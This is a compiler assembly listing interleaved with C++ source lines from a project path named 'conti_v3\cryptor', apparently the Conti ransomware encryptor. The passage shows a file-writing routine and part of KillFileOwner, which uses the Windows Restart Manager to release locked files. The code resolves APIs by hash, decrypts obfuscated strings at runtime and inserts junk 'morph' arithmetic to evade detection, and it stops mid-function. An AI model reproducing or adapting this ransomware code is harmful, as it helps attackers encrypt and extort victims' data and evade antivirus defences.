  0024b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00250	7d 07		 jge	 SHORT $LN158@WriteFullD
  00252	ff c8		 dec	 eax
  00254	83 c8 fc	 or	 eax, -4
  00257	ff c0		 inc	 eax
$LN158@WriteFullD:
  00259	85 c0		 test	 eax, eax
  0025b	74 e3		 je	 SHORT $LL52@WriteFullD

; 51   : 	}

  0025d	eb 51		 jmp	 SHORT $LN59@WriteFullD
$LN60@WriteFullD:

; 52   : 	else if (_morph_var % 2) {

  0025f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00262	b9 02 00 00 00	 mov	 ecx, 2
  00267	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  0026a	2b ce		 sub	 ecx, esi
  0026c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0026e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00273	89 4d f0	 mov	 DWORD PTR _morph_var$2[rbp-64], ecx
  00276	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  00279	f7 e9		 imul	 ecx
  0027b	8b c2		 mov	 eax, edx
  0027d	c1 e8 1f	 shr	 eax, 31
  00280	03 d0		 add	 edx, eax
  00282	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00285	3b c8		 cmp	 ecx, eax
  00287	75 27		 jne	 SHORT $LN59@WriteFullD
  00289	0f 1f 80 00 00
	00 00		 npad	 7
$LL54@WriteFullD:
  00290	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  00293	ff c0		 inc	 eax
  00295	89 45 f0	 mov	 DWORD PTR _morph_var$2[rbp-64], eax
  00298	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0029d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  002a0	f7 e9		 imul	 ecx
  002a2	8b c2		 mov	 eax, edx
  002a4	c1 e8 1f	 shr	 eax, 31
  002a7	03 d0		 add	 edx, eax
  002a9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002ac	3b c8		 cmp	 ecx, eax
  002ae	74 e0		 je	 SHORT $LL54@WriteFullD
$LN59@WriteFullD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 555  : 		TotalWritten += BytesWritten;

  002b0	03 7d f4	 add	 edi, DWORD PTR BytesWritten$[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  002b3	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002b8	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$1[rbp-64], 1547201 ; 00179bc1H
  002bf	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  002c2	f7 e9		 imul	 ecx
  002c4	8b c2		 mov	 eax, edx
  002c6	c1 e8 1f	 shr	 eax, 31
  002c9	03 d0		 add	 edx, eax
  002cb	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002ce	3b c8		 cmp	 ecx, eax
  002d0	74 4d		 je	 SHORT $LN81@WriteFullD

; 49   : 		_morph_var += (int)a + 2;

  002d2	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  002d5	83 c1 02	 add	 ecx, 2
  002d8	03 cb		 add	 ecx, ebx
  002da	89 4d f0	 mov	 DWORD PTR _morph_var$1[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  002dd	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  002e0	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  002e5	7d 07		 jge	 SHORT $LN156@WriteFullD
  002e7	ff c8		 dec	 eax
  002e9	83 c8 fc	 or	 eax, -4
  002ec	ff c0		 inc	 eax
$LN156@WriteFullD:
  002ee	85 c0		 test	 eax, eax
  002f0	75 7e		 jne	 SHORT $LN80@WriteFullD
  002f2	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL73@WriteFullD:
  00300	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  00303	ff c0		 inc	 eax
  00305	89 45 f0	 mov	 DWORD PTR _morph_var$1[rbp-64], eax
  00308	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  0030b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00310	7d 07		 jge	 SHORT $LN155@WriteFullD
  00312	ff c8		 dec	 eax
  00314	83 c8 fc	 or	 eax, -4
  00317	ff c0		 inc	 eax
$LN155@WriteFullD:
  00319	85 c0		 test	 eax, eax
  0031b	74 e3		 je	 SHORT $LL73@WriteFullD

; 51   : 	}

  0031d	eb 51		 jmp	 SHORT $LN80@WriteFullD
$LN81@WriteFullD:

; 52   : 	else if (_morph_var % 2) {

  0031f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00322	b9 02 00 00 00	 mov	 ecx, 2
  00327	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  0032a	2b cb		 sub	 ecx, ebx
  0032c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0032e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00333	89 4d f0	 mov	 DWORD PTR _morph_var$1[rbp-64], ecx
  00336	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  00339	f7 e9		 imul	 ecx
  0033b	8b c2		 mov	 eax, edx
  0033d	c1 e8 1f	 shr	 eax, 31
  00340	03 d0		 add	 edx, eax
  00342	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00345	3b c8		 cmp	 ecx, eax
  00347	75 27		 jne	 SHORT $LN80@WriteFullD
  00349	0f 1f 80 00 00
	00 00		 npad	 7
$LL75@WriteFullD:
  00350	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  00353	ff c0		 inc	 eax
  00355	89 45 f0	 mov	 DWORD PTR _morph_var$1[rbp-64], eax
  00358	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0035d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  00360	f7 e9		 imul	 ecx
  00362	8b c2		 mov	 eax, edx
  00364	c1 e8 1f	 shr	 eax, 31
  00367	03 d0		 add	 edx, eax
  00369	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0036c	3b c8		 cmp	 ecx, eax
  0036e	74 e0		 je	 SHORT $LL75@WriteFullD
$LN80@WriteFullD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 559  : 		BytesToWrite -= BytesWritten;

  00370	2b 5d f4	 sub	 ebx, DWORD PTR BytesWritten$[rbp-64]
  00373	41 3b fe	 cmp	 edi, r14d
  00376	0f 85 d4 fc ff
	ff		 jne	 $LL2@WriteFullD
$LN3@WriteFullD:

; 560  : 
; 561  : 	}
; 562  : 
; 563  : 	return TRUE;

  0037c	b8 01 00 00 00	 mov	 eax, 1
$LN1@WriteFullD:

; 564  : }

  00381	48 8b 4d f8	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-64]
  00385	48 33 cc	 xor	 rcx, rsp
  00388	e8 00 00 00 00	 call	 __security_check_cookie
  0038d	48 8b 9c 24 98
	00 00 00	 mov	 rbx, QWORD PTR [rsp+152]
  00395	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00399	41 5f		 pop	 r15
  0039b	41 5e		 pop	 r14
  0039d	41 5d		 pop	 r13
  0039f	41 5c		 pop	 r12
  003a1	5f		 pop	 rdi
  003a2	5e		 pop	 rsi
  003a3	5d		 pop	 rbp
  003a4	c3		 ret	 0
$LN110@WriteFullD:

; 544  : 
; 545  : 			return FALSE;

  003a5	33 c0		 xor	 eax, eax
  003a7	eb d8		 jmp	 SHORT $LN1@WriteFullD
?WriteFullData@@YAHPEAX0K@Z ENDP			; WriteFullData
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?KillFileOwner@@YAHPEB_W@Z
_TEXT	SEGMENT
$T1 = 64
nProcInfoNeeded$3 = 128
PathName$GSCopy$ = 136
ProcessInfo$4 = 144
dwSession$ = 152
nProcInfo$5 = 156
dwReason$6 = 160
szSessionKey$ = 176
__$ArrayPad$ = 256
PathName$ = 288
?KillFileOwner@@YAHPEB_W@Z PROC				; KillFileOwner, COMDAT

; 568  : {

$LN217:
  00000	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  00005	55		 push	 rbp
  00006	48 8d 6c 24 f0	 lea	 rbp, QWORD PTR [rsp-16]
  0000b	48 81 ec 10 01
	00 00		 sub	 rsp, 272		; 00000110H
  00012	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00019	48 33 c4	 xor	 rax, rsp
  0001c	48 89 45 00	 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 569  : 	if (!getapi::IsRestartManagerLoaded()) {

  00020	83 3d 00 00 00
	00 00		 cmp	 DWORD PTR ?g_IsRstrtMgrLoaded@@3HA, 0 ; g_IsRstrtMgrLoaded
  00027	48 89 4d 88	 mov	 QWORD PTR PathName$GSCopy$[rbp-256], rcx
  0002b	0f 85 92 01 00
	00		 jne	 $LN8@KillFileOw
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00031	c6 44 24 40 00	 mov	 BYTE PTR $T1[rsp], 0
  00036	c6 44 24 41 64	 mov	 BYTE PTR $T1[rsp+1], 100 ; 00000064H
  0003b	c6 44 24 42 42	 mov	 BYTE PTR $T1[rsp+2], 66	; 00000042H
  00040	c6 44 24 43 50	 mov	 BYTE PTR $T1[rsp+3], 80	; 00000050H
  00045	c6 44 24 44 42	 mov	 BYTE PTR $T1[rsp+4], 66	; 00000042H
  0004a	c6 44 24 45 5c	 mov	 BYTE PTR $T1[rsp+5], 92	; 0000005cH
  0004f	c6 44 24 46 42	 mov	 BYTE PTR $T1[rsp+6], 66	; 00000042H
  00054	c6 44 24 47 6f	 mov	 BYTE PTR $T1[rsp+7], 111 ; 0000006fH
  00059	c6 44 24 48 42	 mov	 BYTE PTR $T1[rsp+8], 66	; 00000042H
  0005e	c6 44 24 49 04	 mov	 BYTE PTR $T1[rsp+9], 4
  00063	c6 44 24 4a 42	 mov	 BYTE PTR $T1[rsp+10], 66 ; 00000042H
  00068	c6 44 24 4b 49	 mov	 BYTE PTR $T1[rsp+11], 73 ; 00000049H
  0006d	c6 44 24 4c 42	 mov	 BYTE PTR $T1[rsp+12], 66 ; 00000042H
  00072	c6 44 24 4d 6f	 mov	 BYTE PTR $T1[rsp+13], 111 ; 0000006fH
  00077	c6 44 24 4e 42	 mov	 BYTE PTR $T1[rsp+14], 66 ; 00000042H
  0007c	c6 44 24 4f 27	 mov	 BYTE PTR $T1[rsp+15], 39 ; 00000027H
  00081	c6 44 24 50 42	 mov	 BYTE PTR $T1[rsp+16], 66 ; 00000042H
  00086	c6 44 24 51 69	 mov	 BYTE PTR $T1[rsp+17], 105 ; 00000069H
  0008b	c6 44 24 52 42	 mov	 BYTE PTR $T1[rsp+18], 66 ; 00000042H
  00090	c6 44 24 53 04	 mov	 BYTE PTR $T1[rsp+19], 4
  00095	c6 44 24 54 42	 mov	 BYTE PTR $T1[rsp+20], 66 ; 00000042H
  0009a	c6 44 24 55 7c	 mov	 BYTE PTR $T1[rsp+21], 124 ; 0000007cH
  0009f	c6 44 24 56 42	 mov	 BYTE PTR $T1[rsp+22], 66 ; 00000042H
  000a4	c6 44 24 57 04	 mov	 BYTE PTR $T1[rsp+23], 4
  000a9	c6 44 24 58 42	 mov	 BYTE PTR $T1[rsp+24], 66 ; 00000042H
  000ae	c6 44 24 59 76	 mov	 BYTE PTR $T1[rsp+25], 118 ; 00000076H
  000b3	c6 44 24 5a 42	 mov	 BYTE PTR $T1[rsp+26], 66 ; 00000042H
  000b8	c6 44 24 5b 50	 mov	 BYTE PTR $T1[rsp+27], 80 ; 00000050H
  000bd	c6 44 24 5c 42	 mov	 BYTE PTR $T1[rsp+28], 66 ; 00000042H
  000c2	c6 44 24 5d 49	 mov	 BYTE PTR $T1[rsp+29], 73 ; 00000049H
  000c7	c6 44 24 5e 42	 mov	 BYTE PTR $T1[rsp+30], 66 ; 00000042H
  000cc	c6 44 24 5f 27	 mov	 BYTE PTR $T1[rsp+31], 39 ; 00000027H
  000d1	c6 44 24 60 42	 mov	 BYTE PTR $T1[rsp+32], 66 ; 00000042H
  000d6	c6 44 24 61 7c	 mov	 BYTE PTR $T1[rsp+33], 124 ; 0000007cH
  000db	c6 44 24 62 42	 mov	 BYTE PTR $T1[rsp+34], 66 ; 00000042H
  000e0	c6 44 24 63 10	 mov	 BYTE PTR $T1[rsp+35], 16
  000e5	c6 44 24 64 42	 mov	 BYTE PTR $T1[rsp+36], 66 ; 00000042H
  000ea	c6 44 24 65 6f	 mov	 BYTE PTR $T1[rsp+37], 111 ; 0000006fH
  000ef	c6 44 24 66 42	 mov	 BYTE PTR $T1[rsp+38], 66 ; 00000042H
  000f4	c6 44 24 67 27	 mov	 BYTE PTR $T1[rsp+39], 39 ; 00000027H
  000f9	c6 44 24 68 42	 mov	 BYTE PTR $T1[rsp+40], 66 ; 00000042H
  000fe	c6 44 24 69 56	 mov	 BYTE PTR $T1[rsp+41], 86 ; 00000056H
  00103	c6 44 24 6a 42	 mov	 BYTE PTR $T1[rsp+42], 66 ; 00000042H
  00108	c6 44 24 6b 10	 mov	 BYTE PTR $T1[rsp+43], 16
  0010d	c6 44 24 6c 42	 mov	 BYTE PTR $T1[rsp+44], 66 ; 00000042H
  00112	c6 44 24 6d 04	 mov	 BYTE PTR $T1[rsp+45], 4
  00117	c6 44 24 6e 42	 mov	 BYTE PTR $T1[rsp+46], 66 ; 00000042H
  0011c	c6 44 24 6f 3d	 mov	 BYTE PTR $T1[rsp+47], 61 ; 0000003dH
  00121	c6 44 24 70 42	 mov	 BYTE PTR $T1[rsp+48], 66 ; 00000042H
  00126	c6 44 24 71 50	 mov	 BYTE PTR $T1[rsp+49], 80 ; 00000050H
  0012b	c6 44 24 72 42	 mov	 BYTE PTR $T1[rsp+50], 66 ; 00000042H
  00130	c6 44 24 73 3d	 mov	 BYTE PTR $T1[rsp+51], 61 ; 0000003dH
  00135	c6 44 24 74 42	 mov	 BYTE PTR $T1[rsp+52], 66 ; 00000042H
  0013a	c6 44 24 75 33	 mov	 BYTE PTR $T1[rsp+53], 51 ; 00000033H
  0013f	c6 44 24 76 42	 mov	 BYTE PTR $T1[rsp+54], 66 ; 00000042H
  00144	c6 44 24 77 42	 mov	 BYTE PTR $T1[rsp+55], 66 ; 00000042H
  00149	c6 44 24 78 42	 mov	 BYTE PTR $T1[rsp+56], 66 ; 00000042H
  0014e	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  00153	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  00158	84 c0		 test	 al, al
  0015a	75 56		 jne	 SHORT $LN135@KillFileOw

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0015c	33 db		 xor	 ebx, ebx
  0015e	66 90		 npad	 2
$LL136@KillFileOw:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00160	0f b6 4c 1c 41	 movzx	 ecx, BYTE PTR $T1[rsp+rbx+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00165	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0016a	2b c1		 sub	 eax, ecx
  0016c	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  0016f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00174	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00177	f7 e9		 imul	 ecx
  00179	03 d1		 add	 edx, ecx
  0017b	c1 fa 06	 sar	 edx, 6
  0017e	8b c2		 mov	 eax, edx
  00180	c1 e8 1f	 shr	 eax, 31
  00183	03 d0		 add	 edx, eax
  00185	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00188	2b c8		 sub	 ecx, eax
  0018a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0018f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00192	f7 e9		 imul	 ecx
  00194	03 d1		 add	 edx, ecx
  00196	c1 fa 06	 sar	 edx, 6
  00199	8b c2		 mov	 eax, edx
  0019b	c1 e8 1f	 shr	 eax, 31
  0019e	03 d0		 add	 edx, eax
  001a0	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001a3	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001a5	88 4c 1c 41	 mov	 BYTE PTR $T1[rsp+rbx+1], cl
  001a9	48 ff c3	 inc	 rbx
  001ac	48 83 fb 38	 cmp	 rbx, 56			; 00000038H
  001b0	72 ae		 jb	 SHORT $LL136@KillFileOw
$LN135@KillFileOw:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 571  : 		logs::Write(OBFW(L"Restart manager not loaded."));

  001b2	48 8d 4c 24 41	 lea	 rcx, QWORD PTR $T1[rsp+1]
  001b7	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 572  : 		return FALSE;

  001bc	33 c0		 xor	 eax, eax
  001be	e9 0b 02 00 00	 jmp	 $LN1@KillFileOw
$LN8@KillFileOw:

; 573  : 
; 574  : 	}
; 575  : 
; 576  : 	BOOL Result = FALSE;

  001c3	33 db		 xor	 ebx, ebx
  001c5	48 89 b4 24 28
	01 00 00	 mov	 QWORD PTR [rsp+296], rsi
  001cd	48 89 bc 24 30
	01 00 00	 mov	 QWORD PTR [rsp+304], rdi
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  001d5	33 c0		 xor	 eax, eax
  001d7	48 8d 7d b0	 lea	 rdi, QWORD PTR szSessionKey$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 577  : 	DWORD dwSession = 0x0;

  001db	89 5d 98	 mov	 DWORD PTR dwSession$[rbp-256], ebx
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  001de	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 723  : 	pFunction = (DWORD(WINAPI*)(DWORD*, DWORD, WCHAR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x3763d345, 46);//GetProcAddress(hRstrtmgr, OBFA("RmStartSession"));

  001e3	41 b8 45 d3 63
	37		 mov	 r8d, 929289029		; 3763d345H
  001e9	8d 53 13	 lea	 edx, QWORD PTR [rbx+19]
  001ec	44 8d 4b 2e	 lea	 r9d, QWORD PTR [rbx+46]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  001f0	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 723  : 	pFunction = (DWORD(WINAPI*)(DWORD*, DWORD, WCHAR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x3763d345, 46);//GetProcAddress(hRstrtmgr, OBFA("RmStartSession"));

  001f2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 724  : 	return pFunction(pSessionHandle, dwSessionFlags, strSessionKey);

  001f7	4c 8d 45 b0	 lea	 r8, QWORD PTR szSessionKey$[rbp-256]
  001fb	33 d2		 xor	 edx, edx
  001fd	48 8d 4d 98	 lea	 rcx, QWORD PTR dwSession$[rbp-256]
  00201	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 582  : 	if (pRmStartSession(&dwSession, 0x0, szSessionKey) == ERROR_SUCCESS)

  00203	85 c0		 test	 eax, eax
  00205	0f 85 b1 01 00
	00		 jne	 $LN9@KillFileOw

; 586  : 			0, NULL, 0, NULL) == ERROR_SUCCESS)

  0020b	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 752  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x803a648e, 44);//GetProcAddress(hRstrtmgr, OBFA("RmRegisterResources"));

  0020e	8d 53 13	 lea	 edx, QWORD PTR [rbx+19]
  00211	44 8d 4b 2c	 lea	 r9d, QWORD PTR [rbx+44]
  00215	41 b8 8e 64 3a
	80		 mov	 r8d, -2143656818	; 803a648eH
  0021b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 753  : 	return pFunction(dwSessionHandle, nFiles, rgsFileNames, nApplications, rgApplications, nServices, rgsServiceNames);

  00220	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  00225	4c 8d 45 88	 lea	 r8, QWORD PTR PathName$GSCopy$[rbp-256]
  00229	89 5c 24 28	 mov	 DWORD PTR [rsp+40], ebx
  0022d	8d 53 01	 lea	 edx, QWORD PTR [rbx+1]
  00230	45 33 c9	 xor	 r9d, r9d
  00233	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  00238	8b cf		 mov	 ecx, edi
  0023a	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 586  : 			0, NULL, 0, NULL) == ERROR_SUCCESS)

  0023c	85 c0		 test	 eax, eax
  0023e	0f 85 5d 01 00
	00		 jne	 $LN10@KillFileOw
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00244	48 8d 7d 90	 lea	 rdi, QWORD PTR ProcessInfo$4[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 589  : 			DWORD dwReason = 0x0;

  00248	89 5d a0	 mov	 DWORD PTR dwReason$6[rbp-256], ebx
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0024b	b9 08 00 00 00	 mov	 ecx, 8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 590  : 			UINT nProcInfoNeeded = 0;

  00250	89 5d 80	 mov	 DWORD PTR nProcInfoNeeded$3[rbp-256], ebx
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00253	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 595  : 			ret = (DWORD)pRmGetList(dwSession, &nProcInfoNeeded,

  00255	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 736  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));

  00258	8d 53 13	 lea	 edx, QWORD PTR [rbx+19]
  0025b	44 8d 4b 2d	 lea	 r9d, QWORD PTR [rbx+45]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 591  : 			UINT nProcInfo = 0;

  0025f	89 5d 9c	 mov	 DWORD PTR nProcInfo$5[rbp-256], ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 736  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));

  00262	41 b8 0f ab 2f
	46		 mov	 r8d, 1177529103		; 462fab0fH
  00268	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 737  : 	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);

  0026d	48 8d 4d a0	 lea	 rcx, QWORD PTR dwReason$6[rbp-256]
  00271	45 33 c9	 xor	 r9d, r9d
  00274	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00279	4c 8d 45 9c	 lea	 r8, QWORD PTR nProcInfo$5[rbp-256]
  0027d	8b cf		 mov	 ecx, edi
  0027f	48 8d 55 80	 lea	 rdx, QWORD PTR nProcInfoNeeded$3[rbp-256]
  00283	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 599  : 			if (ret != ERROR_MORE_DATA || !nProcInfoNeeded) {

  00285	3d ea 00 00 00	 cmp	 eax, 234		; 000000eaH
  0028a	0f 85 63 01 00
	00		 jne	 $LN12@KillFileOw
